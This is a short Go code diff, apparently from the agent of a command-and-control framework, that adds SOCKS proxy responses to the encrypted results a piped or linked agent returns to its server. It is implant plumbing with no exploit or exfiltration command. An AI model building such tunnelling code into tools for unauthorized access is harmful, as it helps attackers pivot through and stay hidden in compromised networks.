@@ -292,13 +292,18 @@ func handleServerData(conn *PipeConnection, encryptedPayload string) {
 	linkHandshake := lm.GetHandshakeData()
 	unlinkNotifications := lm.GetUnlinkNotifications()
 
+	// Get pending SOCKS HTTP responses - wait briefly for async responses from target
+	// This is critical for linked agents where responses need to be included synchronously
+	socksResponses := WaitForSocksResponses(200 * time.Millisecond)
+
 	hasResults := resultManager.HasResults()
 	hasLinkData := len(linkData) > 0
 	hasLinkHandshake := linkHandshake != nil
 	hasUnlinkNotifications := len(unlinkNotifications) > 0
+	hasSocksResponses := len(socksResponses) > 0
 
 	// Send results back (including any link data from child agents)
-	if hasResults || hasLinkData || hasLinkHandshake || hasUnlinkNotifications {
+	if hasResults || hasLinkData || hasLinkHandshake || hasUnlinkNotifications || hasSocksResponses {
 		results := resultManager.GetPendingResults()
 
 		payload := map[string]interface{}{
@@ -322,6 +327,11 @@ func handleServerData(conn *PipeConnection, encryptedPayload string) {
 		// Include unlink notifications from child agents
 		if hasUnlinkNotifications {
 			payload[MALLEABLE_LINK_UNLINK_FIELD] = unlinkNotifications
+		}
+
+		// Include SOCKS HTTP responses
+		if hasSocksResponses {
+			payload["sr"] = socksResponses
 		}
 
 		jsonData, err := json.Marshal(payload)
